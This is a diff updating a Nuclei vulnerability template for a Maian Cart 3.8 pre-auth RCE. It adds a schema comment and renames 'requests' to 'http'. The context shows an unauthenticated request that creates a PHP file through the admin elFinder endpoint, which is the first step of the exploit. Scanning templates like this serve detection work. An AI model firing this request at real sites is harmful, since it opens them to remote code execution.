@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: maian-cart-preauth-rce
 info:
   name: Maian Cart 3.8 preauth RCE
@@ -9,7 +10,7 @@ info:
     - https://github.com/DreyAnd/maian-cart-rce
     - https://www.maianscriptworld.co.uk/critical-updates
   tags: rce,unauth,maian
-requests:
+http:
   - raw:
       - |
         GET /admin/index.php?p=ajax-ops&op=elfinder&cmd=mkfile&name={{randstr}}.php&target=l1_Lw HTTP/1.1
